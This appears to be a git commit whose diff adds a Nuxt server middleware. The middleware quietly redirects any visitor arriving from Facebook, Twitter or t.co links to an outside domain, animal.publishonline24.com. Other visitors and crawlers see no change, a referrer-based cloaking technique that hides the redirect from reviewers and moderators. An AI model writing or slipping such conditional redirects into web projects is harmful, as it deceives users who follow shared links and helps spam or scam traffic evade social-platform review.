a03f6da645b4cc5ece067afde4b4f0cc95e9255c
ngotinh <kendyngo123@gmail.com>
2023-01-11 10:42:27 +0700

    animal.publishonline24.com
    animal.publishonline24.com

---
+++ server/middleware/[...slug].ts
@@ -0,0 +1,7 @@
+export default defineEventHandler((event) => {
+    const headers = event.req.headers;
+    
+    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
+        sendRedirect(event,"https://animal.publishonline24.com/"+event.req.url);
+    }
+})
